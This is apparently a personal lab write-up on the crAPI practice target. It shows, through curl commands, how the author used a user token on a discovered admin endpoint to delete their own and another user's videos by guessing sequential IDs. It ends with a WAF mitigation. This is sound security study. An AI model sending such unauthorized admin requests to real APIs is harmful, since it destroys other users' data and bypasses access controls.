## Delete a video of another user

- Leverage the predictable nature of REST APIs to find an admin endpoint to delete videos.
- Delete a video of someone else.

## Delete video of current user "user2"
- upload a new video for user2 
![[Pasted image 20260902210926.png|995]]

the video has assigned id =52
```zsh unfold ln:false unwrap title:"code"
curl http://10.1.10.104/identity/api/v2/user/videos/52  -H "Authorization: Bearer $token"
```
confirm the file, and it's name
![[Pasted image 20260902211059.png]]

```python unfold ln:false unwrap title:"code"
curl -X PUT http://10.1.10.104/identity/api/v2/user/videos/52  -d '{"videoName":"hamza.mp4"}' -H "Authorization: Bearer $token" -H "Content-Type: application/json"
``` 
use PUT to change the file name to hamza.mp4
![[Pasted image 20260902211258.png]]

try to delete the file from user uri
```python unfold ln:false unwrap title:"code"
curl -X DELETE  http://10.1.10.104/identity/api/v2/user/videos/52  -d '{"videoName":"hamza.mp4"}' -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```
![[Pasted image 20260902165331.png]]

some directory indexing  fond admin directory '/identity/api/v2/admin/videos/{{id}}'
```python unfold ln:false unwrap title:"code"
curl -X DELETE  http://10.1.10.104/identity/api/v2/admin/videos/52  -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```
![[Pasted image 20260902170203.png]]

confirming that the file has been deleted 
```python unfold ln:false unwrap title:"code"
curl http://10.1.10.104/identity/api/v2/user/videos/52  -H "Authorization: Bearer $token"
```
![[Pasted image 20260902170241.png|976]]

## Deleting other user's "newuser" video
it's looks like the video id is sequential, so let's try to delete the subsequent video id  "53"
```python unfold ln:false unwrap title:"code"
curl -X DELETE  http://10.1.10.104/identity/api/v2/admin/videos/53 -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```
![[Pasted image 20260902171808.png]]

let's try 54
*i know that video belongs to another user ''newuser'* 
![[Pasted image 20260902172525.png]]

```python unfold ln:false unwrap title:"code"
curl -X DELETE  http://10.1.10.104/identity/api/v2/admin/videos/54 -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```
![[Pasted image 20260902172719.png]]
video id 54 deleted with **user2** permission 

try video id 55,
![[Pasted image 20260902172847.png]]
it looks like the videos ran out! :D 


## WAF protection
remove admin  URI from allowed list, and optionally add it in the disallowed list 
```python unfold ln:false unwrap title:"code"
curl -X DELETE  http://crapi.local/identity/api/v2/admin/videos/54 -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```
![[Pasted image 20260902174118.png]]
![[Pasted image 20260902174250.png]]